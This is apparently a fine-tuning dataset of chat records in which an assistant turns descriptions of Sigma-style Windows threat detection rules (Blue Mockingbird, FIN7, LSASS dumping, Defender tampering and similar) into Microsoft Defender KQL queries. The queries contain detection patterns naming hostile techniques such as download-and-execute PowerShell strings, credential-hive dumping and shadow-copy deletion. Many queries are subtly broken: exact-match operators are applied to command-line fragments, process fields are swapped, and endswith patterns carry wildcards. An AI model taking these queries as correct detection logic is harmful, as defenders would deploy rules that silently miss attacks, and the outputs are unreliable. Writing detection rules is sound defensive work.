{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Attempts to detect system changes made by Blue Mockingbird Topic: proc_creation_win_malware_blue_mockingbird"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"sc config\", \"wercplsupporte.dll\")) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\") or (ProcessCommandLine endswith \"COR_PROFILER\" and InitiatingProcessFolderPath =~ \"\\\\wmic.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious execution from AsperaFaspex as seen used by Mint Sandstorm Topic: proc_creation_win_apt_mint_sandstorm_aspera_faspex_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"aspera\", \"\\\\ruby\")) and ((((ProcessCommandLine contains \" echo \" or ProcessCommandLine contains \"-dumpmode\" or ProcessCommandLine contains \"-ssh\" or ProcessCommandLine contains \".dmp\" or ProcessCommandLine contains \"add-MpPreference\" or ProcessCommandLine contains \"adscredentials\" or ProcessCommandLine contains \"bitsadmin\" or ProcessCommandLine contains \"certutil\" or ProcessCommandLine contains \"csvhost.exe\" or ProcessCommandLine contains \"DownloadFile\" or ProcessCommandLine contains \"DownloadString\" or ProcessCommandLine contains \"dsquery\" or ProcessCommandLine contains \"ekern.exe\" or ProcessCommandLine contains \"FromBase64String\" or ProcessCommandLine contains \"iex \" or ProcessCommandLine contains \"iex(\" or ProcessCommandLine contains \"Invoke-Expression\" or ProcessCommandLine contains \"Invoke-WebRequest\" or ProcessCommandLine contains \"localgroup administrators\" or ProcessCommandLine contains \"net group\" or ProcessCommandLine contains \"net user\" or ProcessCommandLine contains \"o365accountconfiguration\" or ProcessCommandLine contains \"query session\" or ProcessCommandLine contains \"samaccountname=\" or ProcessCommandLine contains \"set-MpPreference\" or ProcessCommandLine contains \"svhost.exe\" or ProcessCommandLine contains \"System.IO.Compression\" or ProcessCommandLine contains \"System.IO.MemoryStream\" or ProcessCommandLine contains \"usoprivate\" or ProcessCommandLine contains \"usoshared\" or ProcessCommandLine contains \"whoami\") or ProcessCommandLine matches regex \"[-/\u2013][Ee^]{1,2}[ncodema^]*\\\\s[A-Za-z0-9+/=]{15,}\") and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\powershell_ise.exe\"))) or (ProcessCommandLine =~ \"lsass\" and (ProcessCommandLine in~ (\"procdump\", \"tasklist\", \"findstr\"))) or ((ProcessCommandLine =~ \"http\" and InitiatingProcessFolderPath =~ \"\\\\curl.exe\") or (ProcessCommandLine in~ (\"localgroup Administrators\", \"/add\")) or (ProcessCommandLine in~ (\"user\", \"/add\")) or ((ProcessCommandLine contains \"reg add\" and ProcessCommandLine contains \"DisableAntiSpyware\" and ProcessCommandLine contains \"\\\\Microsoft\\\\Windows Defender\") or (ProcessCommandLine contains \"reg add\" and ProcessCommandLine contains \"DisableRestrictedAdmin\" and ProcessCommandLine contains \"CurrentControlSet\\\\Control\\\\Lsa\")) or (ProcessCommandLine in~ (\"E:jscript\", \"e:vbscript\")) or (ProcessCommandLine in~ (\"vssadmin\", \"delete\", \"shadows\")) or (ProcessCommandLine in~ (\"wbadmin\", \"delete\", \"catalog\")) or (ProcessCommandLine =~ \"http\" and InitiatingProcessFolderPath =~ \"\\\\wget.exe\") or (ProcessCommandLine in~ (\"wmic\", \"process call create\")) or (ProcessCommandLine in~ (\"wmic\", \"delete\", \"shadowcopy\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Attempts to detect system changes made by Blue Mockingbird Topic: registry_set_mal_blue_mockingbird"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\CurrentControlSet\\\\Services\\\\wercplsupport\\\\Parameters\\\\ServiceDll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT) Topic: proc_creation_win_ntdsutil_usage"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\ntdsutil.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Loading unsigned image (DLL, EXE) into LSASS process Topic: image_load_lsass_unsigned_image_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where InitiatingProcessVersionInfoCompanyName =~ \"false\" and InitiatingProcessFolderPath =~ \"\\\\lsass.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Kapeka backdoor process execution pattern, where the dropper launch the backdoor binary by calling rundll32 and passing the backdoors first export ordinal (#1) with a \"-d\" argument.\n Topic: proc_creation_win_malware_kapeka_backdoor_rundll32_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\") and (ProcessCommandLine in~ (\":\\\\ProgramData\", \"\\\\AppData\\\\Local\")) and ((ProcessCommandLine in~ (\".wll\", \"#1\", \" -d\")) or (ProcessCommandLine has_all (\".wll\") and ProcessCommandLine endswith \"#1\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of DeviceCredentialDeployment to hide a process from view Topic: proc_creation_win_lolbin_device_credential_deployment"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\DeviceCredentialDeployment.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Netsh command execution that whitelists a program located in a suspicious location in the Windows Firewall Topic: proc_creation_win_netsh_fw_allow_program_in_susp_location"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \"firewall\" and ProcessCommandLine contains \"add\" and ProcessCommandLine contains \"allowedprogram\") or (ProcessCommandLine contains \"advfirewall\" and ProcessCommandLine contains \"firewall\" and ProcessCommandLine contains \"add\" and ProcessCommandLine contains \"rule\" and ProcessCommandLine contains \"action=allow\" and ProcessCommandLine contains \"program=\")) and (FolderPath endswith \"\\\\netsh.exe\" or ProcessVersionInfoOriginalFileName =~ \"netsh.exe\") and (ProcessCommandLine in~ (\":\\\\$Recycle.bin\\\\\", \":\\\\RECYCLER.BIN\\\\\", \":\\\\RECYCLERS.BIN\\\\\", \":\\\\SystemVolumeInformation\\\\\", \":\\\\Temp\\\\\", \":\\\\Users\\\\Default\\\\\", \":\\\\Users\\\\Desktop\\\\\", \":\\\\Users\\\\Public\\\\\", \":\\\\Windows\\\\addins\\\\\", \":\\\\Windows\\\\cursors\\\\\", \":\\\\Windows\\\\debug\\\\\", \":\\\\Windows\\\\drivers\\\\\", \":\\\\Windows\\\\fonts\\\\\", \":\\\\Windows\\\\help\\\\\", \":\\\\Windows\\\\system32\\\\tasks\\\\\", \":\\\\Windows\\\\Tasks\\\\\", \":\\\\Windows\\\\Temp\\\\\", \"\\\\Downloads\\\\\", \"\\\\Local Settings\\\\Temporary Internet Files\\\\\", \"\\\\Temporary Internet Files\\\\Content.Outlook\\\\\", \"%Public%\\\\\", \"%TEMP%\", \"%TMP%\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential APT FIN7 exploitation activity as reported by Google.\nIn order to obtain initial access, FIN7 used compromised Remote Desktop Protocol (RDP) credentials to login to a target server and initiate specific Windows process chains.\n Topic: proc_creation_win_apt_fin7_exploitation_indicators"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\notepad++.exe\" and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\") or (InitiatingProcessFileName =~ \"\\\\rdpinit.exe\" and InitiatingProcessFolderPath =~ \"\\\\notepad++.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed MegaSync.exe as seen used by ransomware families like Nefilim, Sodinokibi, Pysa, and Conti. Topic: proc_creation_win_renamed_megasync"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"megasync.exe\" and (not(InitiatingProcessFolderPath =~ \"\\\\megasync.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a new service using the \"sc.exe\" utility. Topic: proc_creation_win_sc_create_service"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"create\", \"binPath\")) and InitiatingProcessFolderPath =~ \"\\\\sc.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects tampering with the MacroRuntimeScanScope registry key to disable runtime scanning of enabled macros Topic: registry_set_disable_macroruntimescanscope"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\SOFTWARE*\" and RegistryKey endswith \"\\\\Microsoft\\\\Office*\" and RegistryKey contains \"\\\\Common\\\\Security\") and RegistryKey endswith \"\\\\MacroRuntimeScanScope\" and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker adds a new \"Debugger\" value to the \"AeDebug\" key in order to achieve persistence which will get invoked when an application crashes Topic: registry_set_aedebug_persistence"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AeDebug\\\\Debugger\" and RegistryValueData endswith \".dll\") and (not(RegistryValueData =~ \"\\\"C:\\\\WINDOWS\\\\system32\\\\vsjitdebugger.exe\\\" -p %ld -e %ld -j 0x%p\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of msdt.exe using the \"cab\" flag which could indicates suspicious diagcab files with embedded answer files leveraging CVE-2022-30190 Topic: proc_creation_win_msdt_susp_cab_options"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\msdt.exe\" or ProcessVersionInfoOriginalFileName =~ \"msdt.exe\") and (ProcessCommandLine contains \" -cab \" or ProcessCommandLine contains \" /cab \" or ProcessCommandLine contains \" \u2013cab \" or ProcessCommandLine contains \" \u2014cab \" or ProcessCommandLine contains \" \u2015cab \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\nMsiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\n Topic: proc_creation_win_msiexec_install_quiet"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \"-i\" or ProcessCommandLine contains \"/i\" or ProcessCommandLine contains \"\u2013i\" or ProcessCommandLine contains \"\u2014i\" or ProcessCommandLine contains \"\u2015i\" or ProcessCommandLine contains \"-package\" or ProcessCommandLine contains \"/package\" or ProcessCommandLine contains \"\u2013package\" or ProcessCommandLine contains \"\u2014package\" or ProcessCommandLine contains \"\u2015package\" or ProcessCommandLine contains \"-a\" or ProcessCommandLine contains \"/a\" or ProcessCommandLine contains \"\u2013a\" or ProcessCommandLine contains \"\u2014a\" or ProcessCommandLine contains \"\u2015a\" or ProcessCommandLine contains \"-j\" or ProcessCommandLine contains \"/j\" or ProcessCommandLine contains \"\u2013j\" or ProcessCommandLine contains \"\u2014j\" or ProcessCommandLine contains \"\u2015j\") and (FolderPath endswith \"\\\\msiexec.exe\" or ProcessVersionInfoOriginalFileName =~ \"msiexec.exe\") and (ProcessCommandLine contains \"-q\" or ProcessCommandLine contains \"/q\" or ProcessCommandLine contains \"\u2013q\" or ProcessCommandLine contains \"\u2014q\" or ProcessCommandLine contains \"\u2015q\")) and (not(((InitiatingProcessFileName =~ \"C:\\\\Windows\\\\CCM\\\\Ccm32BitLauncher.exe\" and (InitiatingProcessIntegrityLevel in~ (\"System\", \"S-1-16-16384\"))) or InitiatingProcessFileName =~ \"C:\\\\Windows\\\\Temp\\\\\" or InitiatingProcessFileName =~ \"\\\\AppData\\\\Local\\\\Temp\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon Topic: proc_creation_win_uninstall_crowdstrike_falcon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\\\\WindowsSensor.exe\", \" /uninstall\", \" /quiet\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious PowerShell invocation command parameters Topic: proc_creation_win_powershell_invocation_specific"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"-nop\", \" -w \", \"hidden\", \" -c \", \"[Convert]::FromBase64String\")) or (ProcessCommandLine in~ (\" -w \", \"hidden\", \"-ep\", \"bypass\", \"-Enc\")) or (ProcessCommandLine in~ (\" -w \", \"hidden\", \"-noni\", \"-nop\", \" -c \", \"iex\", \"New-Object\")) or (ProcessCommandLine in~ (\"iex\", \"New-Object\", \"Net.WebClient\", \".Download\")) or (ProcessCommandLine in~ (\"powershell\", \"reg\", \"add\", \"\\\\software\\\\\")) or (ProcessCommandLine in~ (\"bypass\", \"-noprofile\", \"-windowstyle\", \"hidden\", \"new-object\", \"system.net.webclient\", \".download\"))) and (not((ProcessCommandLine in~ (\"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\", \"Write-ChocolateyWarning\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of \"reg.exe\" in order to dump sensitive registry hives. This includes SAM, SYSTEM and SECURITY hives. Topic: proc_creation_win_reg_dumping_sensitive_hives"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" save \", \" export \", \" \u02e2ave \", \" e\u02e3port \")) and (ProcessCommandLine in~ (\"\\\\system\", \"\\\\sam\", \"\\\\security\", \"\\\\\u02e2ystem\", \"\\\\sy\u02e2tem\", \"\\\\\u02e2y\u02e2tem\", \"\\\\\u02e2am\", \"\\\\\u02e2ecurity\")) and (ProcessCommandLine in~ (\"hklm\", \"hk\u02eam\", \"hkey_local_machine\", \"hkey_\u02eaocal_machine\", \"hkey_loca\u02ea_machine\", \"hkey_\u02eaoca\u02ea_machine\")) and (FolderPath endswith \"\\\\reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"AdPlus.exe\", a binary that is part of the Windows SDK that can be used as a LOLBIN in order to dump process memory and execute arbitrary commands. Topic: proc_creation_win_adplus_memory_dump"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -hang \", \" -pn \", \" -pmn \", \" -p \", \" -po \", \" -c \", \" -sc \")) and (FolderPath endswith \"\\\\adplus.exe\" or ProcessVersionInfoOriginalFileName =~ \"Adplus.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the \"TracingDisabled\" key in order to disable ETW logging for services.exe (SCM) Topic: registry_set_services_etw_tamper"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Tracing\\\\SCM\\\\Regular\\\\TracingDisabled\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the Launch-VsDevShell.ps1 Microsoft signed script to execute commands. Topic: proc_creation_win_lolbin_launch_vsdevshell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"VsWherePath \", \"VsInstallationPath \")) and ProcessCommandLine =~ \"Launch-VsDevShell.ps1\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an uncommon parent process of \"LINK.EXE\".\nLink.EXE in Microsoft incremental linker. Its a utility usually bundled with Visual Studio installation.\nMultiple utilities often found in the same folder (editbin.exe, dumpbin.exe, lib.exe, etc) have a hardcode call to the \"LINK.EXE\" binary without checking its validity.\nThis would allow an attacker to sideload any binary with the name \"link.exe\" if one of the aforementioned tools get executed from a different location.\nBy filtering the known locations of such utilities we can spot uncommon parent process of LINK.EXE that might be suspicious or malicious.\n Topic: proc_creation_win_link_uncommon_parent_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"LINK /\" and InitiatingProcessFolderPath =~ \"\\\\link.exe\") and (not((InitiatingProcessFileName in~ (\"\\\\VC\\\\bin\\\\\", \"\\\\VC\\\\Tools\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Office applications executing a child process that includes directory traversal patterns. This could be an attempt to exploit CVE-2022-30190 (MSDT RCE) or CVE-2021-40444 (MSHTML RCE) Topic: proc_creation_win_exploit_cve_2021_40444_office_directory_traversal"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\winword.exe\", \"\\\\excel.exe\", \"\\\\powerpnt.exe\", \"\\\\msaccess.exe\", \"\\\\mspub.exe\", \"\\\\eqnedt32.exe\", \"\\\\visio.exe\")) and (ProcessCommandLine in~ (\"../../../..\", \"..\\\\..\\\\..\\\\..\", \"..//..//..//..\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "The Fax service attempts to load ualapi.dll, which is non-existent. An attacker can then (side)load their own malicious DLL using this service. Topic: image_load_side_load_ualapi"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"ualapi.dll\" and InitiatingProcessFolderPath =~ \"\\\\fxssvc.exe\") and (not(FolderPath startswith \"C:\\\\Windows\\\\WinSxS\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects KrbRelayUp used to perform a universal no-fix local privilege escalation in Windows domain environments where LDAP signing is not enforced Topic: proc_creation_win_hktl_krbrelayup"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" relay \", \" -Domain \", \" -ComputerName \")) or (ProcessCommandLine in~ (\" krbscm \", \" -sc \")) or (ProcessCommandLine in~ (\" spawn \", \" -d \", \" -cn \", \" -cp \")) or (FolderPath endswith \"\\\\KrbRelayUp.exe\" or ProcessVersionInfoOriginalFileName =~ \"KrbRelayUp.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential abuse of the \"manage-bde.wsf\" script as a LOLBIN to proxy execution Topic: proc_creation_win_lolbin_manage_bde"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"manage-bde.wsf\" and (FolderPath endswith \"\\\\wscript.exe\" or ProcessVersionInfoOriginalFileName =~ \"wscript.exe\")) or ((InitiatingProcessCommandLine =~ \"manage-bde.wsf\" and (InitiatingProcessFileName in~ (\"\\\\cscript.exe\", \"\\\\wscript.exe\"))) and (not(InitiatingProcessFolderPath =~ \"\\\\cmd.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect usage of the \"coregen.exe\" (Microsoft CoreCLR Native Image Generator) binary to sideload arbitrary DLLs. Topic: image_load_side_load_coregen"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where InitiatingProcessFolderPath =~ \"\\\\coregen.exe\" and (not((FolderPath startswith \"C:\\\\Program Files (x86)\\\\Microsoft Silverlight\\\\\" or FolderPath startswith \"C:\\\\Program Files\\\\Microsoft Silverlight\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\System32\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\SysWOW64\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed \"jusched.exe\" as seen used by the cobalt group Topic: proc_creation_win_renamed_jusched"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessVersionInfoFileDescription in~ (\"Java Update Scheduler\", \"Java(TM) Update Scheduler\")) and (not(InitiatingProcessFolderPath =~ \"\\\\jusched.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects regsvr32 execution to download and install DLLs located remotely where the address is an IP address. Topic: proc_creation_win_regsvr32_http_ip_pattern"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\regsvr32.exe\" or ProcessVersionInfoOriginalFileName =~ \"REGSVR32.EXE\") and (ProcessCommandLine in~ (\" /i:http://1\", \" /i:http://2\", \" /i:http://3\", \" /i:http://4\", \" /i:http://5\", \" /i:http://6\", \" /i:http://7\", \" /i:http://8\", \" /i:http://9\", \" /i:https://1\", \" /i:https://2\", \" /i:https://3\", \" /i:https://4\", \" /i:https://5\", \" /i:https://6\", \" /i:https://7\", \" /i:https://8\", \" /i:https://9\", \" -i:http://1\", \" -i:http://2\", \" -i:http://3\", \" -i:http://4\", \" -i:http://5\", \" -i:http://6\", \" -i:http://7\", \" -i:http://8\", \" -i:http://9\", \" -i:https://1\", \" -i:https://2\", \" -i:https://3\", \" -i:https://4\", \" -i:https://5\", \" -i:https://6\", \" -i:https://7\", \" -i:https://8\", \" -i:https://9\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab. Topic: proc_creation_win_esentutl_params"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"esentutl\", \" /p\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Local accounts, System Owner/User discovery using operating systems utilities Topic: proc_creation_win_susp_local_system_owner_account_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((ProcessCommandLine in~ (\" /c\", \"dir \", \"\\\\Users\\\\\")) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\") and (not(ProcessCommandLine =~ \" rmdir \"))) or ((ProcessCommandLine =~ \"user\" and (InitiatingProcessFolderPath in~ (\"\\\\net.exe\", \"\\\\net1.exe\"))) and (not((ProcessCommandLine in~ (\"/domain\", \"/add\", \"/delete\", \"/active\", \"/expires\", \"/passwordreq\", \"/scriptpath\", \"/times\", \"/workstations\"))))) or ((ProcessCommandLine =~ \" /l\" and InitiatingProcessFolderPath =~ \"\\\\cmdkey.exe\") or (InitiatingProcessFolderPath in~ (\"\\\\whoami.exe\", \"\\\\quser.exe\", \"\\\\qwinsta.exe\")) or ((ProcessCommandLine in~ (\"useraccount\", \"get\")) and InitiatingProcessFolderPath =~ \"\\\\wmic.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect the usage of \"DirLister.exe\" a utility for quickly listing folder or drive contents. It was seen used by BlackCat ransomware to create a list of accessible directories and files. Topic: proc_creation_win_dirlister_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"DirLister.exe\" or FolderPath endswith \"\\\\dirlister.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of the Process Monitor driver by processes other than Process Monitor (procmon) itself. Topic: file_event_win_sysinternals_procmon_driver_susp_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".sys\" and (not((InitiatingProcessFolderPath in~ (\"\\\\procmon.exe\", \"\\\\procmon64.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects actions caused by the RedMimicry Winnti playbook Topic: registry_event_redmimicry_winnti_reg"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"HKLM\\\\SOFTWARE\\\\Microsoft\\\\HTMLHelp\\\\data\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of user-specific or system-wide environment variables via the registry. Which contains suspicious commands and strings Topic: registry_set_suspicious_env_variables"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Environment*\" and ((RegistryValueData in~ (\"powershell\", \"pwsh\")) or (RegistryValueData contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" or RegistryValueData contains \"C:\\\\Users\\\\Public\\\\\" or RegistryValueData contains \"TVqQAAMAAAAEAAAA\" or RegistryValueData contains \"TVpQAAIAAAAEAA8A\" or RegistryValueData contains \"TVqAAAEAAAAEABAA\" or RegistryValueData contains \"TVoAAAAAAAAAAAAA\" or RegistryValueData contains \"TVpTAQEAAAAEAAAA\" or RegistryValueData contains \"SW52b2tlL\" or RegistryValueData contains \"ludm9rZS\" or RegistryValueData contains \"JbnZva2Ut\" or RegistryValueData contains \"SQBuAHYAbwBrAGUALQ\" or RegistryValueData contains \"kAbgB2AG8AawBlAC0A\" or RegistryValueData contains \"JAG4AdgBvAGsAZQAtA\") or (RegistryValueData startswith \"SUVY\" or RegistryValueData startswith \"SQBFAF\" or RegistryValueData startswith \"SQBuAH\" or RegistryValueData startswith \"cwBhA\" or RegistryValueData startswith \"aWV4\" or RegistryValueData startswith \"aQBlA\" or RegistryValueData startswith \"R2V0\" or RegistryValueData startswith \"dmFy\" or RegistryValueData startswith \"dgBhA\" or RegistryValueData startswith \"dXNpbm\" or RegistryValueData startswith \"H4sIA\" or RegistryValueData startswith \"Y21k\" or RegistryValueData startswith \"cABhAH\" or RegistryValueData startswith \"Qzpc\" or RegistryValueData startswith \"Yzpc\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a user is potentially trying to bypass the Windows Defender AV by renaming a tool to dump64.exe and placing it in the Visual Studio folder.\nCurrently the rule is covering only usage of procdump but other utilities can be added in order to increase coverage.\n Topic: proc_creation_win_dump64_defender_av_bypass_rename"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath contains \"\\\\Microsoft Visual Studio\\\\\" and InitiatingProcessFolderPath =~ \"\\\\dump64.exe\") and (ProcessVersionInfoOriginalFileName =~ \"procdump\" or (ProcessCommandLine contains \" -ma \" or ProcessCommandLine contains \" -mp \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects \"GoogleUpdate.exe\" spawning a new instance of itself in an uncommon location as seen used by the Goofy Guineapig backdoor Topic: proc_creation_win_malware_goofy_guineapig_googleupdate_uncommon_child_instance"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\GoogleUpdate.exe\" and InitiatingProcessFolderPath =~ \"\\\\GoogleUpdate.exe\") and (not(((FolderPath startswith \"C:\\\\Program Files\\\\Google\\\\\" or FolderPath startswith \"C:\\\\Program Files (x86)\\\\Google\\\\\") or FolderPath contains \"\\\\AppData\\\\Local\\\\Google\\\\Update\\\\\")))"}]}
